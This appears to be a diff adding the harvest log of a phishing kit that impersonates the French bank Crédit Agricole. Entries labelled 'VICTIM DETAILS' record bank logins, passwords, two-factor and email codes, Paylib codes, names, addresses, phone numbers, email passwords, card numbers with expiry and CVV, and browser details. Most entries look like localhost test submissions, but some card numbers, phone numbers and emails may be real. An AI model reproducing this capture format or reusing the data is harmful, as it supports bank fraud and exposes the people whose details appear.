@@ -1,0 +1,866 @@
+/-- REGION INFOS --/109.24.172.100
+Numéro de département : 10
+Caisse régionale : 
+/---------------- VICTIM DETAILS ----------------/
+IP address : 109.24.172.100
+Country : France
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
+/-- END REGION INFOS --/
+
+/-- LOG INFOS --/109.24.172.100
+Numéro de département : 10
+Caisse régionale : 
+Identifiant : 12345678940
+Password : 666666
+/---------------- VICTIM DETAILS ----------------/
+IP address : 109.24.172.100
+Country : France
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
+/-- END LOG INFOS --/
+
+/-- INFOS --/109.24.172.100
+Numéro de département : 10
+Caisse régionale : 
+Identifiant : 12345678940
+Password : 666666
+Authentification forte : 101022
+/---------------- VICTIM DETAILS ----------------/
+IP address : 109.24.172.100
+Country : France
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
+/-- END INFOS --/
+
+/-- INFOS --/109.24.172.100
+Numéro de département : 10
+Caisse régionale : 
+Identifiant : 12345678940
+Password : 666666
+Authentification forte : 101022
+Secure passe : 123456
+/---------------- VICTIM DETAILS ----------------/
+IP address : 109.24.172.100
+Country : France
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
+/-- END INFOS --/
+
+/-- INFOS --/109.24.172.100
+Numéro de département : 10
+Caisse régionale : 
+Identifiant : 12345678940
+Password : 666666
+Authentification forte : 101022
+Secure passe : 123456
+Code email : 147785
+/---------------- VICTIM DETAILS ----------------/
+IP address : 109.24.172.100
+Country : France
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
+/-- END INFOS --/
+
+/-- REGION INFOS --/::1
+Numéro de département : 111111
+Caisse régionale : 
+/---------------- VICTIM DETAILS ----------------/
+IP address : ::1
+Country : 
+OS : Windows 7
+Browser : Chrome
+User agent : Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+/-- END REGION INFOS --/
+
+/-- CREDIT AGRECOLE - REGION INFOS --/::1
+Numéro de département : 
+Caisse régionale : Anjou Maine
+/---------------- VICTIM DETAILS ----------------/
+IP address : ::1
+Country : 
+OS : Windows 7
+Browser : Chrome
+User agent : Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+/-- END REGION INFOS --/
+
+/-- CREDIT AGRECOLE - LOG INFOS --/::1
+Numéro de département : 
+Caisse régionale : Anjou Maine
+Identifiant : 11111111111
+Password : 888888
+/---------------- VICTIM DETAILS ----------------/
+IP address : ::1
+Country : 
+OS : Windows 7
+Browser : Chrome
+User agent : Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+/-- END LOG INFOS --/
+
+/-- CREDIT AGRECOLE - REGION INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END REGION INFOS --/
+
+/-- CREDIT AGRECOLE - LOG INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+Identifiant : 11111111111
+Password : 888888
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END LOG INFOS --/
+
+/-- CREDIT AGRECOLE - AUTHENTIFICATIONFORTE INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+Identifiant : 11111111111
+Password : 888888
+Authentification forte : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - Securepasse INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+Identifiant : 11111111111
+Password : 888888
+Authentification forte : 111111
+Secure passe : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - Code Email INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+Identifiant : 11111111111
+Password : 888888
+Authentification forte : 111111
+Secure passe : 111111
+Code email : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - REGION INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END REGION INFOS --/
+
+/-- CREDIT AGRECOLE - LOG INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+Identifiant : 11111111111
+Password : 888888
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END LOG INFOS --/
+
+/-- CREDIT AGRECOLE - AUTHENTIFICATIONFORTE INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+Identifiant : 11111111111
+Password : 888888
+Authentification forte : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - Securepasse INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+Identifiant : 11111111111
+Password : 888888
+Authentification forte : 111111
+Secure passe : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - Code Email INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+Identifiant : 11111111111
+Password : 888888
+Authentification forte : 111111
+Secure passe : 111111
+Code email : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - REGION INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END REGION INFOS --/
+
+/-- CREDIT AGRECOLE - LOG INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+Identifiant : 11111111111
+Password : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END LOG INFOS --/
+
+/-- CREDIT AGRECOLE - AUTHENTIFICATIONFORTE INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+Identifiant : 11111111111
+Password : 111111
+Authentification forte : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - Securepasse INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+Identifiant : 11111111111
+Password : 111111
+Authentification forte : 111111
+Secure passe : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - Code Email INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+Identifiant : 11111111111
+Password : 111111
+Authentification forte : 111111
+Secure passe : 111111
+Code email : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - MAIL ACCESS DETAILS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+Identifiant : 11111111111
+Password : 111111
+Authentification forte : 111111
+Secure passe : 111111
+Code email : 111111
+nom : skb
+prenom : yoyo
+address : 27 avenue de liverpool
+Telephone : 0681412651
+zip_code : 92700
+city : Colombes
+N° de carte : 4972 0397 2391 8235
+Date d'expiration : 12 / 23
+CVV : 234
+EMAIL : ihhuov@orange.fr
+Mot de pass : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END DETAILS --/
+
+/-- CREDIT AGRECOLE - PAYLIB DETAILS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : 
+Identifiant : 
+Password : 
+Authentification forte : 
+Secure passe : 
+Code email : 
+nom : 
+prenom : 
+address : 
+Telephone : 
+zip_code : 
+city : 
+N° de carte : 
+Date d'expiration : 
+CVV : 
+EMAIL : 
+Mot de pass : 
+PAYLIB : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END DETAILS --/
+
+/-- CREDIT AGRECOLE -  CC DETAILS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : 
+Identifiant : 
+Password : 
+Authentification forte : 
+Secure passe : 
+Code email : 
+nom : skb
+prenom : Mourad
+address : 11 fefehf fbr
+Telephone : 0681412651
+zip_code : 27100
+city : Sarcelles
+N° de carte : 4972 0182 8662 7662
+Date d'expiration : 12 / 23
+CVV : 123
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END DETAILS --/
+
+/-- CREDIT AGRECOLE - REGION INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Champagne Bourgogne
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END REGION INFOS --/
+
+/-- CREDIT AGRECOLE - REGION INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Champagne Bourgogne
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END REGION INFOS --/
+
+/-- CREDIT AGRECOLE - LOG INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Champagne Bourgogne
+Identifiant : 11111111111
+Password : 888888
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END LOG INFOS --/
+
+/-- CREDIT AGRECOLE - AUTHENTIFICATIONFORTE INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Champagne Bourgogne
+Identifiant : 11111111111
+Password : 888888
+Authentification forte : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - Securepasse INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Champagne Bourgogne
+Identifiant : 11111111111
+Password : 888888
+Authentification forte : 111111
+Secure passe : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - Code Email INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Champagne Bourgogne
+Identifiant : 11111111111
+Password : 888888
+Authentification forte : 111111
+Secure passe : 111111
+Code email : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - MAIL ACCESS DETAILS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Champagne Bourgogne
+Identifiant : 11111111111
+Password : 888888
+Authentification forte : 111111
+Secure passe : 111111
+Code email : 111111
+nom : skb
+prenom : Mourad
+address : 11 fefehf fbr
+Telephone : 0681412651
+zip_code : 27100
+city : Sarcelles
+N° de carte : 4972 0182 8662 7662
+Date d'expiration : 12 / 23
+CVV : 123
+EMAIL : ihhuov@orange.fr
+Mot de pass : ddzzdz
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END DETAILS --/
+
+/-- CREDIT AGRECOLE - AUTHENTIFICATIONFORTE INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : 
+Identifiant : 
+Password : 
+Authentification forte : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - Securepasse INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : 
+Identifiant : 
+Password : 
+Authentification forte : 111111
+Secure passe : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - Code Email INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : 
+Identifiant : 
+Password : 
+Authentification forte : 111111
+Secure passe : 111111
+Code email : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - REGION INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Centre Loire
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END REGION INFOS --/
+
+/-- CREDIT AGRECOLE - LOG INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Centre Loire
+Identifiant : 11111111111
+Password : 888888
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END LOG INFOS --/
+
+/-- CREDIT AGRECOLE - AUTHENTIFICATIONFORTE INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Centre Loire
+Identifiant : 11111111111
+Password : 888888
+Authentification forte : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - AUTHENTIFICATIONFORTE INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Centre Loire
+Identifiant : 11111111111
+Password : 888888
+Authentification forte : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - Securepasse INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Centre Loire
+Identifiant : 11111111111
+Password : 888888
+Authentification forte : 111111
+Secure passe : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - Code Email INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Centre Loire
+Identifiant : 11111111111
+Password : 888888
+Authentification forte : 111111
+Secure passe : 111111
+Code email : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE -  CC DETAILS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Centre Loire
+Identifiant : 11111111111
+Password : 888888
+Authentification forte : 111111
+Secure passe : 111111
+Code email : 111111
+nom : sc
+prenom : cscsc
+address : 22 cededde ee
+Telephone : 0681412651
+zip_code : 92600
+city : Colombes
+N° de carte : 4972 0182 8662 7662
+Date d'expiration : 12 / 23
+CVV : 122
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END DETAILS --/
+
+/-- CREDIT AGRECOLE - MAIL ACCESS DETAILS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Centre Loire
+Identifiant : 11111111111
+Password : 888888
+Authentification forte : 111111
+Secure passe : 111111
+Code email : 111111
+nom : sc
+prenom : cscsc
+address : 22 cededde ee
+Telephone : 0681412651
+zip_code : 92600
+city : Colombes
+N° de carte : 4972 0182 8662 7662
+Date d'expiration : 12 / 23
+CVV : 122
+EMAIL : ihhuov@orange.fr
+Mot de pass : 11111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END DETAILS --/
+
+/-- CREDIT AGRECOLE - PAYLIB DETAILS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : 
+Identifiant : 
+Password : 
+Authentification forte : 
+Secure passe : 
+Code email : 
+nom : 
+prenom : 
+address : 
+Telephone : 
+zip_code : 
+city : 
+N° de carte : 
+Date d'expiration : 
+CVV : 
+EMAIL : 
+Mot de pass : 
+PAYLIB : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END DETAILS --/
+
+/-- CREDIT AGRECOLE - REGION INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END REGION INFOS --/
+
+/-- CREDIT AGRECOLE - LOG INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+Identifiant : 11111111111
+Password : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END LOG INFOS --/
+
+/-- CREDIT AGRECOLE - AUTHENTIFICATIONFORTE INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+Identifiant : 11111111111
+Password : 111111
+Authentification forte : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - Securepasse INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+Identifiant : 11111111111
+Password : 111111
+Authentification forte : 111111
+Secure passe : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE - Code Email INFOS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+Identifiant : 11111111111
+Password : 111111
+Authentification forte : 111111
+Secure passe : 111111
+Code email : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END INFOS --/
+
+/-- CREDIT AGRECOLE -  CC DETAILS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+Identifiant : 11111111111
+Password : 111111
+Authentification forte : 111111
+Secure passe : 111111
+Code email : 111111
+nom : skb
+prenom : skb
+address : 22 cededde ee
+Telephone : 0681412654
+zip_code : 92800
+city : Gennevilliers
+N° de carte : 4972 0234 5677 5544
+Date d'expiration : 12 / 23
+CVV : 123
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END DETAILS --/
+
+/-- CREDIT AGRECOLE - MAIL ACCESS DETAILS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : Charente Maritime Deux-Sèvres
+Identifiant : 11111111111
+Password : 111111
+Authentification forte : 111111
+Secure passe : 111111
+Code email : 111111
+nom : skb
+prenom : skb
+address : 22 cededde ee
+Telephone : 0681412654
+zip_code : 92800
+city : Gennevilliers
+N° de carte : 4972 0234 5677 5544
+Date d'expiration : 12 / 23
+CVV : 123
+EMAIL : rninri@orange.fr
+Mot de pass : 111111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END DETAILS --/
+
+/-- CREDIT AGRECOLE - PAYLIB DETAILS --/127.0.0.1
+Numéro de département : 
+Caisse régionale : 
+Identifiant : 
+Password : 
+Authentification forte : 
+Secure passe : 
+Code email : 
+nom : 
+prenom : 
+address : 
+Telephone : 
+zip_code : 
+city : 
+N° de carte : 
+Date d'expiration : 
+CVV : 
+EMAIL : 
+Mot de pass : 
+PAYLIB : 111111
+/---------------- VICTIM DETAILS ----------------/
+IP address : 127.0.0.1
+Country : 
+OS : Windows 10
+Browser : Firefox
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+/-- END DETAILS --/
+
+/-- CREDIT AGRECOLE - REGION INFOS --/::1
+Numéro de département : 
+Caisse régionale : Côtes d\'Armor
+/---------------- VICTIM DETAILS ----------------/
+IP address : ::1
+Country : 
+OS : Windows 10
+Browser : Chrome
+User agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 OPR/81.0.4196.61
+/-- END REGION INFOS --/
+
